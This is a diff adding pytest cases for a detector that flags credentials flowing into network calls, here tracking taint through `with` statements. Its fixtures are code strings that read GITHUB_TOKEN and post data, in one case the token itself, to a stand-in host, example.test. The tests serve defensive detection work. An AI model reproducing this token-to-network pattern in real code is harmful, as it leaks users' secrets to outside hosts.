@@ -502,6 +502,37 @@ def test_safe_keyword_for_sink_parameter_is_not_contaminated_by_other_keyword() 
     assert find_credential_network_flows(ast.parse(source), source) == []
 
 
+def test_with_context_manager_optional_target_does_not_raise() -> None:
+    source = (
+        "import os, requests\n"
+        "secret = os.getenv('GITHUB_TOKEN')\n"
+        "with context_manager() as value:\n"
+        "    requests.post('https://example.test', data=value)\n"
+    )
+    assert find_credential_network_flows(ast.parse(source), source) == []
+
+
+def test_with_tainted_context_propagates_to_optional_target() -> None:
+    source = (
+        "import os, requests\n"
+        "secret = os.getenv('GITHUB_TOKEN')\n"
+        "with secret as value:\n"
+        "    requests.post('https://example.test', data=value)\n"
+    )
+    flows = find_credential_network_flows(ast.parse(source), source)
+    assert [(flow.source.line, flow.sink.line) for flow in flows] == [(2, 4)]
+
+
+def test_with_safe_context_kills_old_optional_target_taint() -> None:
+    source = (
+        "import os, requests\n"
+        "secret = os.getenv('GITHUB_TOKEN')\n"
+        "with 'safe' as secret:\n"
+        "    requests.post('https://example.test', data=secret)\n"
+    )
+    assert find_credential_network_flows(ast.parse(source), source) == []
+
+
 @pytest.mark.parametrize(
     "source",
     [
